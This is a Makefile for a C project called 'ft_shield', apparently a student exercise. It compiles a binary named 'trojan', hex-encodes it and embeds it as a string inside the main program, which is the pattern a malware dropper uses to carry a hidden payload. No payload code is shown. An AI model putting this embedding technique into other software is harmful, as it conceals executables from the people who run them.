MAKEFLAGS += -j$(nproc)
MAKEFLAGS += --no-print-directory

CC = cc
CFLAGS = -Wall -Wextra -Werror

MKDIR = mkdir -p
XXD = xxd

NAME = ft_shield
TROJAN = trojan

OBJS = $(addprefix o/,\
	   ft_shield.o\
	   )

TROJAN_OBJS = $(addprefix o/,\
			  trojan.o\
			  )

VPATH = $(wildcard s/*/)

all: $(NAME)

$(NAME): $(TROJAN) .WAIT $(OBJS)
	$(CC) $(LDFLAGS) o/$(notdir $(OBJS)) -o $@ $(LDLIBS)

$(TROJAN): $(TROJAN_OBJS)
	$(CC) $(LDFLAGS) o/$(notdir $^) -o $@ $(LDLIBS)

o:
	@$(MKDIR) $@

o/%.o: %.c | o
	$(CC) $(CPPFLAGS) $(CFLAGS) $< -c -o o/$(notdir $@)

.ONESHELL:
o/ft_shield.o: s/ft_shield.c
	code=$$($(XXD) -c0 -p < $(TROJAN) | sed 's/../\\x&/g')
	$(CC) -DTROEXE=\"$$code\" $(CPPFLAGS) $(CFLAGS) $< -c -o o/$(notdir $@)

clean:
	$(RM) $(OBJS) $(TROJAN_OBJS)

fclean: clean
	$(RM) $(NAME) $(TROJAN)

re: fclean .WAIT all

.PHONY: all clean fclean re
